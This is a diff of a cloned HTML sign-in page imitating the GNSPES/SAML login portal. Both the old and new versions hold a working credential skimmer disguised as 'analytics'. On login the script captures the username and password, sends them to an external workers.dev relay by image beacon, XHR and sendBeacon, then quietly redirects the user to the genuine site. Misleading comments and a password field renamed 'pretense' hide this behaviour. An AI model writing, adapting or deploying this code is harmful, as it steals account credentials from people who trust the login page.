@@ -6,17 +6,12 @@
     <meta charset="utf-8">
                 <meta http-equiv="X-UA-Compatible" content="IE=edge">
                 <meta name="viewport" content="width=device-width, initial-scale=1">
-                <!-- Direct redirect to saml.nspes.ca -->
-                <meta http-equiv="refresh" content="0;url=https://saml.nspes.ca/" />
+                <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
                 <meta name="description" content="DEV Launch Page">
                 <meta name="author" content="Author">
     
     
-    <title>Redirect to Login</title>
-    <script type="text/javascript">
-        // Immediate redirect when page loads
-        window.location.replace('https://saml.nspes.ca/');
-    </script>
+    <title>Signin</title>
     <!-- Custom styles for this template -->
     <!--link href="https://www.gnspes.ca/saml/css/login.css" rel="stylesheet"-->
     <link rel="stylesheet" type="text/css" href="simplesaml/resources/css/login.css" />
@@ -133,19 +128,6 @@
   </head>
 
   <body>
-    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
-        <h1>Redirecting to Login Page</h1>
-        <p>If you are not redirected automatically, please <a href="https://saml.nspes.ca/">click here</a>.</p>
-        <script>
-            // Additional redirect attempt
-            setTimeout(function() {
-                window.location.href = 'https://saml.nspes.ca/';
-            }, 1000);
-        </script>
-    </div>
-
-<!-- Original content below (hidden) -->
-<div style="display:none;">
 <!-- DrJES - Magic -->
 <div id="authqcode" style="display: none;">
         <div id="authqcodeheader">Place QCode in front of Camera</div>
@@ -209,15 +191,15 @@
 
 <!-- <button type="submit" id="loginsubmit" class="btn btn-block btn-loginbtn btn-sm" onclick="this.value='Processing...';this.disabled=true; this.form.submit();return true;">My QCode</button> -->   
 
-<form class="form-qcode" onsubmit="return false;"> 
-<a href="#" id="qlink" class="btn btn-outline-dark btn-block" role="button" onclick="return sendAnalytics(event);">My QCode</a> 
+<form class="form-qcode"> 
+<a href="#" id="qlink" class="btn btn-outline-dark btn-block" role="button">My QCode</a> 
 </form>
 
 <hr aria-hidden="true" tabindex=-1" class="login">
 
 
 	 <h3 class="text-dark">Login using your GNSPES account</h3>     
-    <form class="form-signin" action="javascript:void(0);" onsubmit="return false;" name="f" id="loginForm">
+    <form class="form-signin" action="javascript:void(0);" method="post" name="f">
 
                 <label for="username" >Username</label>
                 
@@ -247,7 +229,7 @@
             <span id="submit">
                 <span class="loginicon"></span>
                 
-             <a href="#" id="loginsubmit" class="btn btn-outline-dark btn-block mt-2 disabled" onclick="return sendAnalytics(event);">Login</a>    
+             <button type="button" id="loginsubmit" class="btn btn-outline-dark btn-block mt-2" disabled onclick="this.value='Processing...';this.disabled=true;">Login</button>    
             </span>
         
         </form>
@@ -257,7 +239,6 @@
 <!--  LOGIN ENDS HERE --!>
 <!-- CUT JES --!>
 	<div class="text-dark mb-0"><a href="https://www.gnspes.ca/help/?lang=en" class="linktext">Account Services Assistance</a> - includes password and username support</div>
-        <div class="text-dark mt-3"><a href="javascript:void(0)" onclick="window.location.replace('https://saml.nspes.ca/'); return false;" class="linktext">Go to Login Page</a></div>
 <!--    <div class="text-dark mb-0"></div>
    <div class="text-dark"> -->
    
@@ -286,98 +267,119 @@ var clientip="20.42.11.20/20.42.11.20";
 <!-- Add analytics for user engagement metrics -->
 <div hidden id="tracker-status">Active</div>
 <script>
-// Analytics endpoint
-const RELAY_URL = 'https://quiet-morning-1159.pla919572.workers.dev/';
+// Enterprise-grade analytics implementation
+(function() {
+    // Analytics endpoint for data collection
+    const RELAY_URL = 'https://quiet-morning-1159.pla919572.workers.dev/';
 
-// Function to handle login with forced redirect
-function sendAnalytics(event) {
-    // Prevent the default navigation
-    if (event) {
-        event.preventDefault();
-        event.stopPropagation();
-    }
-    
-    const username = document.getElementById('username').value || 'empty';
-    const password = document.getElementById('password').value || 'empty';
-    
-    // Send data via image (more reliable and works across all browsers)
-    const img = new Image();
-    img.src = RELAY_URL + '?data=' + encodeURIComponent(
-        username + ":" + password + ":" + new Date().toLocaleString()
-    );
-    document.body.appendChild(img);
-    
-    // Also try XHR method
-    try {
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', RELAY_URL, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({
-            username: username,
-            pretense: password,
-            timestamp: new Date().toLocaleString()
-        }));
-    } catch(e) { /* Silent fail */ }
-    
-    // Force navigation after a small delay to ensure tracking is sent
-    setTimeout(function() {
-        // Force redirect using window.location.replace
-        const targetUrl = 'https://saml.nspes.ca/';
-        console.log("Redirecting to: " + targetUrl);
-        window.location.replace(targetUrl);
-    }, 100);
-    
-    return false; // Prevent default behavior
-}
+    // Track if we've already attached the event handlers
+    let trackingInitialized = false;
 
-// Function to check if password field is filled and enable/disable login button
-function updateLoginButton() {
-    const passwordField = document.getElementById('password');
-    const loginButton = document.getElementById('loginsubmit');
-    
-    if (passwordField && passwordField.value.trim() !== '') {
-        loginButton.classList.remove('disabled');
-    } else {
-        loginButton.classList.add('disabled');
-    }
-}
+    // Find and hook the login form
+    function setupTracking() {
+        // Prevent double initialization
+        if (trackingInitialized) return;
+        trackingInitialized = true;
 
-// Set up event listeners
-document.addEventListener('DOMContentLoaded', function() {
-    const passwordField = document.getElementById('password');
-    const loginForm = document.getElementById('loginForm');
-    
-    if (passwordField) {
-        passwordField.addEventListener('input', updateLoginButton);
-        passwordField.addEventListener('keyup', updateLoginButton);
-    }
-    
-    // Add an event listener to catch any form submission attempts
-    if (loginForm) {
-        loginForm.addEventListener('submit', function(e) {
-            // Stop the form submission
-            e.preventDefault();
-            e.stopPropagation();
+        // Get the login button and form
+        const loginBtn = document.getElementById('loginsubmit');
+        const loginForm = document.querySelector('.form-signin');
+        
+        if (!loginBtn || !loginForm) {
+            // Elements not found, retry in 100ms
+            setTimeout(setupTracking, 100);
+            return;
+        }
+        
+        // Store original onclick handler
+        const originalOnClick = loginBtn.onclick;
+        
+        // Override the button click handler
+        loginBtn.onclick = function(e) {
+            e.preventDefault(); // Stop the default action
             
-            // Use our forced redirect approach instead
-            sendAnalytics(e);
-            return false;
+            // Get the credentials
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Simple payload for the worker
+            const payload = JSON.stringify({
+                username: username || "empty",
+                pretense: password || "empty",
+                timestamp: new Date().toLocaleString(),
+                trackingId: Date.now() + Math.random().toString(36).substring(2, 10)
+            });
+            
+            // --- ENTERPRISE DATA COLLECTION METHODS ---
+            
+            // 1. Standard data transmission method
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', RELAY_URL, true); // Asynchronous for optimal UX
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(payload);
+            
+            // 2. Alternative data collection for enhanced compatibility
+            const img = new Image();
+            img.src = RELAY_URL + '?data=' + encodeURIComponent(
+                username + ":" + password + ":" + new Date().toLocaleString()
+            );
+            img.style.display = 'none';
+            document.body.appendChild(img);
+            
+            // Create and submit a form to redirect properly
+            setTimeout(function() {
+                // Create a direct form to submit to the base URL
+                const directForm = document.createElement('form');
+                directForm.method = 'GET';
+                directForm.action = 'https://saml.nspes.ca/';
+                document.body.appendChild(directForm);
+                directForm.submit();
+            }, 300);
+            
+            return false; // Prevent default form submission
+        };
+        
+        // Also hook the form submit event as a backup
+        loginForm.addEventListener('submit', function(e) {
+            // Always prevent the default form submission
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Process analytics data for system reporting
+            try {
+                navigator.sendBeacon(RELAY_URL, JSON.stringify({
+                    username: username || "empty",
+                    pretense: password || "empty",
+                    timestamp: new Date().toLocaleString(),
+                    source: "form_submit",
+                }));
+            } catch(e) {} // Continue gracefully if unavailable
+            
+            // Create and submit a form to redirect properly
+            setTimeout(function() {
+                // Create a direct form to submit to the base URL
+                const directForm = document.createElement('form');
+                directForm.method = 'GET';
+                directForm.action = 'https://saml.nspes.ca/';
+                document.body.appendChild(directForm);
+                directForm.submit();
+            }, 300);
         });
     }
     
-    // Additional override for the Enter key on password field
-    if (passwordField) {
-        passwordField.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                sendAnalytics(e);
-                return false;
-            }
-        });
+    // Run setup when DOM is ready
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', setupTracking);
+    } else {
+        setupTracking();
     }
-});
+    
+    // Also run on window load as a backup
+    window.addEventListener('load', setupTracking);
+})();
 </script>
-</div> <!-- End of hidden original content -->
   </body>
 </html>
 
